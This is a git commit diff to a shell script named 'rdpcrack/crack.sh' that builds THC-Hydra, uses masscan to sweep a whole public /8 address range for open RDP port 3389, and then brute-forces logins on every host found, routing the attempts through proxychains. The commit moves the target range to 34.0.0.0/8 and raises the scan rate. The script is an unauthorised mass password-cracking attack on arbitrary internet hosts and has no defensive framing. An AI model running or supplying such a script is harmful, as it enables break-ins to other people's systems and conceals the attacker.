d03b7e394cc6c88adbc46e5377962064b9e849f6
Remi Girard <54126451+independentcod@users.noreply.github.com>
2020-04-05 00:07:56 -0400

    Final release

--- rdpcrack/crack.sh
+++ rdpcrack/crack.sh
@@ -9,6 +9,6 @@ git clone https://github.com/vanhauser-thc/thc-hydra.git;
 cd thc-hydra;
 ./configure && make -j8 && sudo make install;
 cd ..;
-sudo masscan --range 185.0.0.0-185.255.255.255 --rate 5000 -p3389 --open --banners -oG rdp.scan;
-for i in `grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" rdp.scan`; do proxychains hydra -vv rdp://$i -e nsr -L user -P pass -t1 -W1 -I >hydra.log;
+sudo masscan --range 34.0.0.0-34.255.255.255 --rate 50000 -p3389 --open --banners -oG rdp.scan;
+for i in `grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" rdp.scan`; do proxychains hydra -vv rdp://$i -e ns -L user -P pass -t1 -W1 -I >hydra.log;
 done
